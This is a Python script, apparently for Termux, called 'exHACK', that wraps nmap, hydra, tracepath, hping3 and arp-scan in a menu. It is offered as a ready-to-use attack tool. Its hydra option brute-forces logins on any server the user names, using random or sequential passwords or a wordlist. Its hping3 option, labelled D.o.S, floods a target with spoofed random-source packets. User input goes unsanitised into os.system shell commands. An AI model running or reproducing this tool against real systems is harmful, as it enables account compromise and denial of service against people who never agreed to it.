import os, time, random
while True:
    install = input('Commencing installation of nessacary packages and tools. Would you like to continue? [y (Yes, please)/n (No, I already have those tools installed)]: ')
    if install in ['y','yes']:
        print('Resuming installation')
        time.sleep(1)
        os.system('apt install root-repo tsu toilet hydra nmap tracepath hping3 arp-scan')
        break
    if install in ['n','no']:
        print('Acknowledged, resuming the script as if the nessacary tools are already installed')
        time.sleep(3)
        break
    else:
        print('Please input either \'y\' or \'yes\' or \'n\' or \'no\'')
        
os.system('toilet -f ascii12 -F border \'exHACK\'')
print('Welcome to the exHACK automator framework')
time.sleep(0.5)
print('Made by IRISnoir')
time.sleep(0.5)

while True:
    print('')
    print('Please select an action:')
    print('')
    print('0. Exit framework')
    time.sleep(0.1)
    print('1. Network mapper - Nmap')
    time.sleep(0.1)
    print('2. Bruteforce - Hydra')
    time.sleep(0.1)
    print('3. Traceroute')
    time.sleep(0.1)
    print('4. D.o.S - Hping3 (Root required)')
    time.sleep(0.1)
    print('5. Network radar - Arp-Scan and Arp-Fingerprint (Root required)')
    time.sleep(0.1)

    action_select = input('exHACK> ')

    if action_select == str('0'):
        print('Exiting framework, thank you for using exHACK.')
        exit()
        
    if action_select == str('1'):
        print('Nmap activated.')

        while True:
            server = input('*Specify the server which you want scanned: ')
            if server == '':
                print('You have to enter the server in order to scan.')
            else:
                print('')
                break

        save_conf = input('Do you wish to save your scan results into a file? [y/n](Default: n): ')
        if save_conf in ['y' , 'yes']:
            success_file = input('Specify the name of the file that will have your scan results written in (Leave blank if you change your mind): ')
            if success_file == '':
                print('You changed your mind, the results will not be written to a file.')
                time.sleep(4)
            else:
                success_file = '-oN ' + success_file + ' '
        else:
            print('Scan results will not be written to a file.')
            success_file = ''
            
        print('')
        print('Method:')
        time.sleep(0.1)
        print('[1] - Casual port scan (Quick, only shows ports and their status)')
        time.sleep(0.1)
        print('[2] - Advanced probe (Not too long, shows ports and their probed contents)')
        time.sleep(0.1)
        print('[3] - Fatal probe (Long time, shows ports and their heavily probed contents)')
        time.sleep(0.1)

        while True:
            method = input('Select scan method: ')
            
            if method == str('1'):
                os.system('nmap -Pn ' + success_file + server)
                break

            if method == str('2'):
                os.system('nmap -Pn -A ' + success_file + server)
                break

            if method == str('3'):
                os.system('nmap -vv -dd -PE -PP -PM -Pn -R --system-dns --scanflags URGACKPSHRSTSYNFIN -p1-65535 -sV --version-all --version-trace --script all --script-trace --min-rate 0.1 -D RND:5 --data-length 1400 --badsum --reason --packet-trace -A ' + success_file + server)

    if action_select == str('2'):
        print('Hydra activated')
        
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        numbers = '0123456789'

        while True:
            server = input('*Specify the server which you want bruteforced: ')
            if server == '':
                print('Please enter a server to commence bruteforce.')
            else:
                print('')
                break

        while True:
            login = input('*Specify the login or a file containing a list of logins which you want to bruteforce: ')
            if login != '':
                try:
                    open(login)
                except FileNotFoundError:
                    print('Data specified is not a filename.')
                    time.sleep(3)
                    login_spec = '-l'
                    break
                else:
                    print('Data specified is a filename.')
                    time.sleep(3)
                    login_spec = '-L'
                    break
            else:
                print('You must enter the login name or file to continue.')

        print('''
Supported protocols: adam6500 asterisk cisco cisco-enable cvs ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp
''')
        while True:
            protocol = input('*Specify the protocol type: ')
            if protocol == '':
                print('You must specify a protocol.')
            else:
                print('Protocol given.')
                print('')
                break

        while True:
            port = input('Select the port, leave blank and hydra will select default: ')
            if port == '':
                print('Port number not given. Hydra will select default.')
                print('')
                time.sleep(3)
                break
            else:
                try:
                    int(port) / 1
                except ValueError:
                    print('The port must be an integer.')
                else:
                    print('Port given.')
                    print('')
                    port = '-s ' + str(port) + ' '
                    time.sleep(1)
                    break

        extra = input('Input the extra statement (example: for https-post-form): ')
        if extra == '':
            print('No supplied statement.')
        else:
            print('Statement supplied.')

        print('')
        time.sleep(1)
        save_conf = input('Do you wish to save cracked password pairs into a file? [y/n](Default: n): ')
        if save_conf in ['y' , 'yes']:
            success_file = input('Specify the name of the file that will have your success written in (Leave blank if you change your mind): ')
            if success_file == '':
                print('You changed your mind, successful cracks will not be written to a file.')
                time.sleep(4)
            else:
                success_file = '-o ' + success_file + ' '
        else:
            print('Successful cracks will not be written to a file.')
            success_file = ''

        print('')

        while True:
            print('Method:')
            time.sleep(0.1)
            print('[1] - Random characters - Random customizable length (Use Ctrl-Z to kill)')
            time.sleep(0.1)
            print('[2] - Integer bruteforce - Non-random (Use Ctrl-Z to kill)')
            time.sleep(0.1)
            print('[3] - Integer bruteforce - Random (Use Ctrl-Z to kill)')
            time.sleep(0.1)
            print('[4] - Specify file')
            time.sleep(0.1)
            method = input('*Select your bruteforcing method: ')
            if method == '1':
                while True:
                    method_1_min_len = input('Input minimum length (Leave blank and the minimum length will be considered as \'1\'.): ')
                    if method_1_min_len == '':
                        print('The minimum length is set to \'1\'.')
                        method_1_min_len = 1
                        break
                    else:
                        try:
                            int(method_1_min_len) / 1
                        except ValueError:
                            print('An integer is required.')
                        else:
                            print('The minimum length is set to \'' + method_1_min_len + '\'.')
                            break
                while True:
                    method_1_max_len = input('*Input maximum length: ')
                    if method_1_max_len == '':
                        print('You must supply a maximum length.')
                    else:
                        try:
                            int(method_1_max_len) / 1
                        except ValueError:
                            print('An integer is required.')
                        else:
                            print('The maximum length is set to \'' + method_1_max_len + '\'')
                            break
                while True:
                    password = ''.join(random.SystemRandom().choice(alphabet) for c in range(random.randint(int(method_1_min_len),int(method_1_max_len))))
                    os.system('hydra ' + login_spec + ' ' + login + ' -p ' + password + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
            if method == '2':
                password = 0
                while True:
                    os.system('hydra ' + login_spec + ' ' + login + ' -p ' + str(password) + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
                    password += 1
            if method == '3':
                while True:
                    method_3_min_len = input('Input minimum length (Leave blank and the minimum length will be considered as \'1\'.): ')
                    if method_3_min_len == '':
                        print('The minimum length is set to \'1\'.')
                        method_3_min_len = 1
                        break
                    else:
                        try:
                            int(method_3_min_len) / 1
                        except ValueError:
                            print('An integer is required.')
                        else:
                            print('The minimum length is set to \'' + method_3_min_len + '\'')
                            break
                while True:
                    method_3_max_len = input('*Input maximum length: ')
                    if method_3_max_len == '':
                        print('You must supply a maximum length.')
                    else:
                        try:
                            int(method_3_max_len) / 1
                        except ValueError:
                            print('An integer is required.')
                        else:
                            print('The maximum length is set to \'' + '\'')
                            break
                while True:
                    password = ''.join(random.SystemRandom().choice(numbers) for c in range(random.randint(int(method_3_min_len),int(method_3_max_len))))
                    os.system('hydra ' + login_spec + ' ' + login + ' -p ' + str(password) + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
            if method == '4':
                while True:
                    password = input('*Specify your wordlist: ')
                    if password == '':
                        print('You have to input a wordlist.')
                    else:
                        try:
                            open(password)
                        except FileNotFoundError:
                            print('The file you specified doesn\'t exist.')
                        else:
                            break
                os.system('hydra ' + login_spec + ' ' + login + ' -P ' + str(password) + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
                break
            else:
                print('Please select a number from the list.')

    if action_select == str('3'):
        print('Tracepath activated.')

        server = input('Please input the server which you want tracerouted: ')
        os.system('tracepath -b -l 1400 -m 200 ' + server)

    if action_select == str('4'):
        print('Hping3 activated')
        server = input('Input the server which you want to D.o.S: ')

        print('Modes:')
        time.sleep(0.1)
        print('1. TCP')
        time.sleep(0.1)
        print('2. Raw IP')
        time.sleep(0.1)
        print('3. ICMP')
        time.sleep(0.1)
        print('4. UDP')
        time.sleep(0.1)
        mode = input('Choose your mode (You can only choose one, default: TCP): ')
        if mode == str('1'):
            print('Mode: TCP')
            mode = ' '
        elif mode == str('2'):
            print('Mode: Raw IP')
            mode = ' -0 '
        elif mode == str('3'):
            print('Mode: ICMP')
            mode = ' -1 '
        elif mode == str('4'):
            print('Mode: UDP')
            mode = ' -2 '
        else:
            print('Mode: TCP')
            mode = ' '
        print('')
            
        os.system('tsudo hping3 --flood --beep -V --rand-source -t 65535 -m 65535 -f --force-icmp -b -FSRPAUXY -d -T' + mode + server)

    if action_select == str('5'):
        print('Arp-Scan and Arp-Fingerprint activated')

        print('Initiating Arp-Scan')
        os.system('tsudo arp-scan -l -v -R -D -L')
        print('')
        print('Initiating Arp-Fingerprint')
        os.system('tsudo arp-fingerprint -v -l')

    else:
        print('Please choose a number from the list.')
